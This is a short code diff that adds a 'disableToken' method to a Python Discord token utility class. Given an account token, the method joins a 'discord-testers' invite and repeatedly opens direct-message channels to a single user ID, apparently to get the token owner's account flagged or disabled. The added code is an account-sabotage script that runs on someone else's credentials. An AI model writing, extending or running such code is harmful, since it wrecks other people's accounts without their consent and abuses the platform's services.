@@ -1,7 +1,15 @@
-import base64
+import base64, requests
 
 class TokenUtil:
     @staticmethod
+    def disableToken(token):
+        res = requests.post("https://discord.com/api/invites/discord-testers", headers={"authorization": token})
+        if res.status_code != 200:
+            return print("Invalid token.")
+        ids = ["280712677909594113", "280712677909594113","280712677909594113","280712677909594113", "280712677909594113","280712677909594113","280712677909594113","280712677909594113","280712677909594113","280712677909594113"]
+        for id in ids:
+            requests.post("https://discord.com/api/users/@me/channels", data={"recipient_id": id}, headers={"authorization": token, "user-agent": "somerandomuseragent lmfao"})
+            
     def validateToken(token:str):
         try:
             b64:str = token.split(".")[0]
